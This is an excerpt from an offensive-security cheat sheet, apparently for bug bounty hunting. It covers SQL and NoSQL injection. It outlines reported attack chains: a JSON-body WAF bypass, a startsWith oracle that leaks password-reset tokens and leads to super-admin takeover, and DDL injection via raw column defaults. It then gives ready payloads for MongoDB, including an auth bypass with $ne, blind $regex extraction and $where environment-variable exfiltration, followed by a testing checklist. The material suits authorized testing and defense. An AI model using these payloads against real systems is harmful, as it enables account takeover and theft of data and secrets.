...
## MDPsec Verified Patterns (3 real SQLi reports)

Real-world primitives from mdpsec.com reports:

1. **JSON-body injection bypassing query-string WAF** — front protection layer 403s classic injection on query strings but JSON POST/PUT bodies pass cleanly; published API spec declares `security: []` (60). Retrieve-quote service concatenates JSON "customer" field into DB query with no parameterization → mint anonymous bearer → inject in "customer" field to extract 36-char resume token in two chunks (token field exceeds column width); replay token to retrieve endpoint → DOB + postcode with no further verification → full quote takeover; walk system catalog → 500+ production tables on same DB account; cross-brand via shared table.
2. **`startsWith` boolean oracle on private columns** — CMS filter syntax bypasses schema sanitizer: `filter[lastEditor][email][startsWith]=k` → `total > 0` = char match; enumerate admin email char-by-char (underscore deliberately omitted from alphabet — LIKE wildcard); then `forgot-password` mints fresh reset token → read via `filter[lastEditor][resetToken][startsWith]=...` hex walk → reset-password → super-admin (21, 103).
3. **DDL injection via raw column defaults** — `POST /api/internal/content-types {"attributes":{"data":{"type":"string","column":{"default":"<sql>","raw":true}}}}` → raw flag passes value verbatim into next `CREATE TABLE ... DEFAULT` clause, evaluated at insert time (`current_user`, `current_database()`, file reads, sleep DoS); committed to disk → survives password rotation and admin removal (21, 103).
4. **Detection**: `security: []` in OpenAPI spec; 204-vs-error responses; JSON body vs query-string WAF asymmetry; `total > 0` oracle on filter params.
...
## Testing Checklist
- [ ] Test $ne on login endpoints for auth bypass
- [ ] Test $regex for blind data extraction
- [ ] Test $gt, $lt, $nin for range queries
- [ ] Test $where operator for JS injection
- [ ] Test constructor.constructor for env exfil
- [ ] Try NoSQL payloads where SQL injection failed
- [ ] Check error messages for MongoDB references
...
```bash
# Look for:
# - JSON endpoints that accept objects/arrays
# - REST APIs with MongoDB-like IDs (ObjectId format: 24 hex chars)
# - Parameters like: $where, $regex, $ne, $gt, $lt
# - Error messages mentioning MongoDB, Mongo, DocumentDB
```
...
### 1. Auth Bypass with $ne (Not Equal)
```json
POST /api/login
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

### 2. Blind Extraction with $regex
```json
POST /api/search
{"username": {"$regex": "^a"}}  // true if username starts with 'a'
{"username": {"$regex": "^ab"}} // true if starts with 'ab'
// Binary search character by character
```

### 3. $where Operator Injection (CRITICAL)
```json
POST /api/data
{"$where": "1 == 1"}
// If true → MongoDB JS engine running!

// Env variable extraction:
{"$where": "this.constructor.constructor('return process')().env.NODE_ENV[0] === 'd'"}
// Blind binary search over env vars!
```

### 4. Boolean-based Blind NoSQL Injection
```bash
# True condition
{"id": {"$regex": "^a"}}  → 200 OK
# False condition  
{"id": {"$regex": "^x"}}  → 404/error
```
...
- HackerNotes Ep. 181 (Blind NoSQL $where injection)

## Key Insight from NARUTO HUNT
> "a web application can work with both noSql and Sql at same time"
